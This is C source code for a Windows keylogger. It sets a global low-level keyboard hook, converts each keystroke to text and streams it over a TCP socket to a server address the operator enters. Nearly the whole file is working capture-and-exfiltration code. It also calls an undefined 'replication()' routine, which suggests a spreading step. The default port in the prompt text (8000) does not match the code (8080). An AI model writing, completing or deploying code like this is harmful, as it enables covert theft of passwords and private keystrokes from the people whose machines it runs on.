#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <fcntl.h>
#include <io.h>

#pragma comment(lib, "ws2_32.lib")

#define IP_LEN 16
#define PORT_BUFFER_LEN 10

#define BUFFER_SIZE 1024

SOCKET sock = INVALID_SOCKET;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
			DWORD vkCode = kbdStruct->vkCode;
			DWORD scanCode = kbdStruct->scanCode;

			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);

			keyboardState[VK_SHIFT] = (BYTE)(GetAsyncKeyState(VK_SHIFT) & 0x8000 ? 0x80 : 0);
			keyboardState[VK_CONTROL] = (BYTE)(GetAsyncKeyState(VK_CONTROL) & 0x8000 ? 0x80 : 0);
			keyboardState[VK_MENU] = (BYTE)(GetAsyncKeyState(VK_MENU) & 0x8000 ? 0x80 : 0);
			keyboardState[VK_CAPITAL] = (BYTE)(GetKeyState(VK_CAPITAL) & 0x0001);

			HWND foreground = GetForegroundWindow();
			DWORD threadId = GetWindowThreadProcessId(foreground, NULL);
			HKL layout = GetKeyboardLayout(threadId);

			wchar_t unicodeBuf[8] = { 0 };
			int result = ToUnicodeEx(vkCode, scanCode, keyboardState, unicodeBuf, 8, 0, layout);

			if (result > 0) {
				wprintf(L"Sent: %.*ls\n", result, unicodeBuf);
				fflush(stdout);

				char utf8Buf[32] = { 0 };
				int utf8Len = WideCharToMultiByte(CP_UTF8, 0, unicodeBuf, result, utf8Buf, sizeof(utf8Buf), NULL, NULL);

				if (utf8Len > 0) {
					int sent = send(sock, utf8Buf, utf8Len, 0);

					if (sent == SOCKET_ERROR) {
						wprintf(L"Send Error: %d\n", WSAGetLastError());
					}
				}
			}
			else if (result == -1) {
				wprintf(L"[Dead Key: vk=0x%02X]\n", vkCode);
				fflush(stdout);
			}
			else {
				wprintf(L"[Special Key: vk=0x%02X]\n", vkCode);
				fflush(stdout);
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void) {

	char SERVER_IP[IP_LEN];
	char port_buffer[PORT_BUFFER_LEN];
	char input_buffer[100];
	int SERVER_PORT;
	int valid = 0;

	while (!valid) {
		printf("Press Enter to continue with default IP and port (127.0.0.1:8000), or type 'custom' to enter manually: ");

		if (fgets(input_buffer, sizeof(input_buffer), stdin) != NULL) {
			input_buffer[strcspn(input_buffer, "\n")] = '\0';

			if (input_buffer[0] == '\0') {
				snprintf(SERVER_IP, sizeof(SERVER_IP), "127.0.0.1");
				SERVER_PORT = 8080;
				valid = 1;
			}
			else if (strcmp(input_buffer, "custom") == 0) {
				int ip_valid = 0;
				while (!ip_valid) {
					printf("\nEnter Server IP Address: ");
					if (fgets(SERVER_IP, sizeof(SERVER_IP), stdin) != NULL) {
						SERVER_IP[strcspn(SERVER_IP, "\n")] = '\0';

						struct in_addr sa;
						if (inet_pton(AF_INET, SERVER_IP, &sa) == 1) {
							ip_valid = 1;
						}
						else {
							printf("\nError: Invalid IP address format! Please try again.");
						}
					}
				}

				int port_valid = 0;
				while (!port_valid) {
					printf("Enter Server Port (1-65535): ");
					if (fgets(port_buffer, sizeof(port_buffer), stdin) != NULL) {
						char *endptr;
						long val = strtol(port_buffer, &endptr, 10);

						if (endptr != port_buffer && (*endptr == '\n' || *endptr == '\0') && (val >= 1 && val <= 65535)) {
							SERVER_PORT = (int)val;
							port_valid = 1;
							valid = 1;
						}
						else {
							printf("\nError: Invalid port number! Must be an integer between 1 and 65535.");
						}
					}
				}
			}
			else {
				printf("Error: Unknown command. Please press Enter or type 'custom'.\n\n");
			}
		}
	}

	replication();
	
	WSADATA wsaData;
	struct sockaddr_in serv_addr;

	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8);
	_setmode(_fileno(stdout), _O_U8TEXT);
	_setmode(_fileno(stderr), _O_U8TEXT);

	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
	if (!hook) {
		fwprintf(stderr, L"Hook could not be set up: %lu\n", GetLastError());
		return 1;
	}

	wprintf(L"\nInitializing Winsock...\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		wprintf(L"Error: WSAStartup failed. Error Code: %d\n", WSAGetLastError());
		return 1;
	}

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
		wprintf(L"Error: Could not create socket. Error Code: %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(SERVER_PORT);

	if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
		wprintf(L"Error: Invalid or unsupported address.\n");
		closesocket(sock);
		WSACleanup();
		return 1;
	}

	wprintf(L"Connecting to the server... (%hs:%d)\n", SERVER_IP, SERVER_PORT);
	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
		wprintf(L"Error: Connection failed.\n");
		closesocket(sock);
		WSACleanup();
		return 1;
	}

	wprintf(L"Connection successful!\n\n");

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hook);

	closesocket(sock);
	WSACleanup();
}
